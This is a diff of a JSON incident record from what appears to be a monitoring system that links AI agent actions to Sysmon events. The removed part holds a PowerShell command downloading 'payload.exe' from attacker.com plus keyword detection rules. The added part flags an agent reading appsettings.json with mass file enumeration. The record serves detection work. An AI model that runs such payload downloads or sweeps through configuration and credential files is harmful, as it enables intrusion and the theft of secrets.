@@ -1,26 +1,61 @@
 {
     "incident_id": "INC-0009",
+    "incident_type": "TOOL_ANOMALY",
     "ai_event": {
-        "agent": "Background Script/AI",
-        "action": "terminal",
-        "timestamp": "2026-06-18T16:43:57.2461222Z"
-    },
-    "sysmon_event": {
-        "EventID": 1,
-        "TimestampUTC": "2026-06-18T16:43:57.2461222Z",
-        "ProcessId": "34856",
-        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "CommandLine": "powershell.exe  -Command \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile payload.exe\"",
-        "ParentProcessId": "38608",
-        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "ai_event_id": "TOOL-1782403845142",
+        "event_type": "tool_invocation",
+        "agent": "Claude Code",
+        "action": "tool_invocation",
+        "tool": "file_read",
+        "timestamp": "2026-06-25T16:10:45.142266+00:00",
+        "raw_command": "",
+        "session_id": "session-613ba7be",
+        "user": "",
+        "tool_type": "file_read",
+        "target": "appsettings.json",
+        "parameters": {},
+        "tool_analysis": {
+            "has_anomaly": true,
+            "risk_score": 95,
+            "risk_level": "CRITICAL",
+            "anomalies": [
+                {
+                    "type": "EXCESSIVE_TOOL_USAGE",
+                    "detail": "12 calls/30s"
+                },
+                {
+                    "type": "SENSITIVE_FILE_ACCESS",
+                    "detail": "appsettings.json (matched: appsettings.json)"
+                },
+                {
+                    "type": "MASS_FILE_ENUMERATION",
+                    "detail": "12 files/10s"
+                }
+            ],
+            "analyzed_at": "2026-06-25T16:10:45.142419+00:00"
+        },
         "_correlated": true
     },
-    "severity": "CRITICAL",
-    "matched_rules": [
-        "Suspicious Keyword: invoke-webrequest",
-        "Suspicious Keyword: http",
-        "Suspicious Keyword: payload",
-        "Process: PowerShell",
-        "Network: Outbound Comm"
-    ]
+    "sysmon_event": {},
+    "tool_analysis": {
+        "has_anomaly": true,
+        "risk_score": 95,
+        "risk_level": "CRITICAL",
+        "anomalies": [
+            {
+                "type": "EXCESSIVE_TOOL_USAGE",
+                "detail": "12 calls/30s"
+            },
+            {
+                "type": "SENSITIVE_FILE_ACCESS",
+                "detail": "appsettings.json (matched: appsettings.json)"
+            },
+            {
+                "type": "MASS_FILE_ENUMERATION",
+                "detail": "12 files/10s"
+            }
+        ],
+        "analyzed_at": "2026-06-25T16:10:45.142419+00:00"
+    },
+    "severity": "CRITICAL"
 }
